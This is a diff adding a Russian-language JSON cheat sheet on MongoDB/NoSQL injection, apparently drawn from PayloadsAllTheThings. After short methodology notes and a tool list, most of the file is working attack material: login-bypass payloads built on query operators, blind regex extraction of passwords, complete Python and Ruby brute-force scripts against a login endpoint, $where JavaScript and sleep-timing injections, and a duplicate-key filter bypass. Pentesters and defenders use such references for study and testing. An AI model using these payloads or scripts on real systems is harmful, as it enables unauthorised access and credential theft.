@@ -1,0 +1,173 @@
+{
+  "category": "NoSQL Injection",
+  "source": "PayloadsAllTheThings/NoSQL Injection/",
+  "entries": [
+    {
+      "subcategory": "Методология",
+      "title": "Что такое NoSQL-инъекция",
+      "language": "text",
+      "tags": ["methodology", "mongodb"],
+      "body": "NoSQL-инъекция возникает, когда атакующий подмешивает вредоносный ввод в запрос к NoSQL-базе.\nВ отличие от SQL-инъекции, чаще всего эксплуатируются JSON-запросы и операторы MongoDB: $ne, $gt, $regex, $where.\nИщи места, где пользовательский ввод попадает прямо в фильтр запроса (логин, поиск, фильтры по цене и т.п.)."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Где искать и как тестировать",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "• Формы логина — самый частый вектор (обход аутентификации через $ne / $gt / $regex).\n• Поля поиска и фильтры (цена, категория) — подмешивай оператор вместо значения.\n• Параметры в URL и JSON-теле POST — пробуй и [$ne]= в form-urlencoded, и {\"$ne\": ...} в JSON.\n• Нет видимого ответа — переходи на blind: boolean по $regex или timing по $where/sleep.\n• Полезно знать, в JSON или в form-urlencoded уходит запрос — синтаксис инъекции отличается."
+    },
+    {
+      "subcategory": "Методология",
+      "title": "Тулзы и лаборатории",
+      "language": "text",
+      "tags": ["tools", "labs"],
+      "body": "NoSQLMap — автоматизированный перебор и эксплуатация NoSQL-баз.\ndigininja/nosqlilab — лаба для практики NoSQL-инъекций.\nBurp-NoSQLiScanner — расширение Burp для поиска NoSQL-инъекций.\nLabs: Root Me — «NoSQL injection - Authentication» и «NoSQL injection - Blind»."
+    },
+    {
+      "subcategory": "Операторы MongoDB",
+      "title": "Операторы сравнения и их смысл",
+      "language": "table",
+      "tags": ["mongodb", "operators"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Оператор", "Описание"],
+          "rows": [
+            ["$ne", "не равно (not equal)"],
+            ["$regex", "регулярное выражение"],
+            ["$gt", "больше чем (greater than)"],
+            ["$lt", "меньше чем (lower than)"],
+            ["$nin", "не входит в список (not in)"]
+          ]
+        }
+      }
+    },
+    {
+      "subcategory": "Операторы MongoDB",
+      "title": "Оператор-инъекция в поиск (пример уязвимости)",
+      "language": "javascript",
+      "tags": ["mongodb", "operators", "injection"],
+      "body": "// Уязвимый код: пользовательский ввод попадает прямо в значение\ndb.products.find({ \"price\": userInput })\n\n// Атакующий подставляет вместо значения оператор:\n{ \"$gt\": 0 }\n\n// Итоговый запрос вернёт ВСЕ товары с ценой > 0 (утечка данных):\ndb.products.find({ \"price\": { \"$gt\": 0 } })"
+    },
+    {
+      "subcategory": "Обход аутентификации (URL-форма)",
+      "title": "Обход логина через операторы (form-urlencoded)",
+      "language": "http",
+      "tags": ["mongodb", "auth-bypass", "form-urlencoded"],
+      "body": "username[$ne]=toto&password[$ne]=toto\nlogin[$regex]=a.*&pass[$ne]=lol\nlogin[$gt]=admin&login[$lt]=test&pass[$ne]=1\nlogin[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto"
+    },
+    {
+      "subcategory": "Обход аутентификации (JSON)",
+      "title": "Обход логина через операторы (JSON-тело)",
+      "language": "json",
+      "tags": ["mongodb", "auth-bypass", "json"],
+      "body": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}\n{\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"}}\n{\"username\": {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}}\n{\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}"
+    },
+    {
+      "subcategory": "Обход аутентификации (JSON)",
+      "title": "Подбор имени пользователя через $in",
+      "language": "json",
+      "tags": ["mongodb", "auth-bypass", "json"],
+      "body": "{\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\":\"\"}}"
+    },
+    {
+      "subcategory": "Blind/boolean экстракция",
+      "title": "Определение длины значения через $regex",
+      "language": "http",
+      "tags": ["mongodb", "blind", "regex", "length"],
+      "body": "username[$ne]=toto&password[$regex]=.{1}\nusername[$ne]=toto&password[$regex]=.{3}"
+    },
+    {
+      "subcategory": "Blind/boolean экстракция",
+      "title": "Посимвольная экстракция через $regex (form-urlencoded)",
+      "language": "http",
+      "tags": ["mongodb", "blind", "regex", "extraction"],
+      "body": "username[$ne]=toto&password[$regex]=m.{2}\nusername[$ne]=toto&password[$regex]=md.{1}\nusername[$ne]=toto&password[$regex]=mdp\n\nusername[$ne]=toto&password[$regex]=m.*\nusername[$ne]=toto&password[$regex]=md.*"
+    },
+    {
+      "subcategory": "Blind/boolean экстракция",
+      "title": "Посимвольная экстракция через $regex (JSON)",
+      "language": "json",
+      "tags": ["mongodb", "blind", "regex", "extraction"],
+      "body": "{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^m\" }}\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^md\" }}\n{\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^mdp\" }}"
+    },
+    {
+      "subcategory": "Blind/boolean экстракция",
+      "title": "Blind-скрипт: POST с JSON-телом",
+      "language": "python",
+      "tags": ["blind", "python", "regex"],
+      "body": "import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\n\nusername=\"admin\"\npassword=\"\"\nu=\"http://example.org/login\"\nheaders={'content-type': 'application/json'}\n\nwhile True:\n    for c in string.printable:\n        if c not in ['*','+','.','?','|']:\n            payload='{\"username\": {\"$eq\": \"%s\"}, \"password\": {\"$regex\": \"^%s\" }}' % (username, password + c)\n            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\n            if 'OK' in r.text or r.status_code == 302:\n                print(\"Found one more char : %s\" % (password+c))\n                password += c"
+    },
+    {
+      "subcategory": "Blind/boolean экстракция",
+      "title": "Blind-скрипт: POST с urlencoded-телом",
+      "language": "python",
+      "tags": ["blind", "python", "form-urlencoded"],
+      "body": "import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\n\nusername=\"admin\"\npassword=\"\"\nu=\"http://example.org/login\"\nheaders={'content-type': 'application/x-www-form-urlencoded'}\n\nwhile True:\n    for c in string.printable:\n        if c not in ['*','+','.','?','|','&','$']:\n            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)\n            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)\n            if r.status_code == 302 and r.headers['Location'] == '/dashboard':\n                print(\"Found one more char : %s\" % (password+c))\n                password += c"
+    },
+    {
+      "subcategory": "Blind/boolean экстракция",
+      "title": "Blind-скрипт: GET (Python)",
+      "language": "python",
+      "tags": ["blind", "python", "get"],
+      "body": "import requests\nimport urllib3\nimport string\nimport urllib\nurllib3.disable_warnings()\n\nusername='admin'\npassword=''\nu='http://example.org/login'\n\nwhile True:\n  for c in string.printable:\n    if c not in ['*','+','.','?','|', '#', '&', '$']:\n      payload=f\"?username={username}&password[$regex]=^{password + c}\"\n      r = requests.get(u + payload)\n      if 'Yeah' in r.text:\n        print(f\"Found one more char : {password+c}\")\n        password += c"
+    },
+    {
+      "subcategory": "Blind/boolean экстракция",
+      "title": "Blind-скрипт: GET (Ruby)",
+      "language": "javascript",
+      "tags": ["blind", "ruby", "get"],
+      "body": "require 'httpx'\n\nusername = 'admin'\npassword = ''\nurl = 'http://example.org/login'\n# CHARSET = (?!..?~).to_a # all ASCII printable characters\nCHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'\nGET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']\nsession = HTTPX.plugin(:persistent)\n\nwhile true\n  CHARSET.each do |c|\n    unless GET_EXCLUDE.include?(c)\n      payload = \"?username=#{username}&password[$regex]=^#{password + c}\"\n      res = session.get(url + payload)\n      if res.body.to_s.match?('Yeah')\n        puts \"Found one more char : #{password + c}\"\n        password += c\n      end\n    end\n  end\nend"
+    },
+    {
+      "subcategory": "$where JS-инъекция",
+      "title": "Условия $where: '1 == 1' (всегда истина)",
+      "language": "javascript",
+      "tags": ["mongodb", "where", "injection"],
+      "body": "true, $where: '1 == 1'\n, $where: '1 == 1'\n$where: '1 == 1'\n', $where: '1 == 1'\n1, $where: '1 == 1'"
+    },
+    {
+      "subcategory": "$where JS-инъекция",
+      "title": "Инъекция через закрытие строки и JS-выражение",
+      "language": "javascript",
+      "tags": ["mongodb", "where", "injection"],
+      "body": "|| 1==1\n';return 'a'=='a' && ''=='\n\";return(true);var xyz='a\n0;return true"
+    },
+    {
+      "subcategory": "$where JS-инъекция",
+      "title": "Регекс-матч по полю через this (с %00)",
+      "language": "javascript",
+      "tags": ["mongodb", "where", "regex", "blind"],
+      "body": "' && this.password.match(/.*/)//+%00\n' && this.passwordzz.match(/.*/)//+%00\n'%20%26%26%20this.password.match(/.*/)//+%00\n'%20%26%26%20this.passwordzz.match(/.*/)//+%00"
+    },
+    {
+      "subcategory": "$where JS-инъекция",
+      "title": "$or / $comment и вставка через mapReduce",
+      "language": "javascript",
+      "tags": ["mongodb", "where", "injection"],
+      "body": "', $or: [ {}, { 'a':'a\n' } ], $comment:'successful MongoDB injection'\ndb.injection.insert({success:1});\ndb.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1"
+    },
+    {
+      "subcategory": "Оператор-инъекция в логин (короткие пробники)",
+      "title": "Минимальные пробники оператора",
+      "language": "text",
+      "tags": ["mongodb", "operators", "injection"],
+      "body": "{ $ne: 1 }\n{$gt: ''}\n{\"$gt\": \"\"}\n[$ne]=1\n{\"&exists\":false}"
+    },
+    {
+      "subcategory": "Timing (blind по времени)",
+      "title": "Задержка через sleep() и busy-loop в $where",
+      "language": "javascript",
+      "tags": ["mongodb", "blind", "timing", "where"],
+      "body": "';sleep(5000);\n';sleep(5000);'\n';sleep(5000);+'\n';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"
+    },
+    {
+      "subcategory": "Обход WAF и фильтров",
+      "title": "Снятие pre-condition через дублирование ключа",
+      "language": "javascript",
+      "tags": ["mongodb", "waf-bypass", "duplicate-key"],
+      "body": "// В MongoDB при дублировании ключа в документе побеждает ПОСЛЕДНЕЕ вхождение.\n// Итоговое значение \"id\" будет \"100\":\n{\"id\":\"10\", \"id\":\"100\"}"
+    }
+  ]
+}
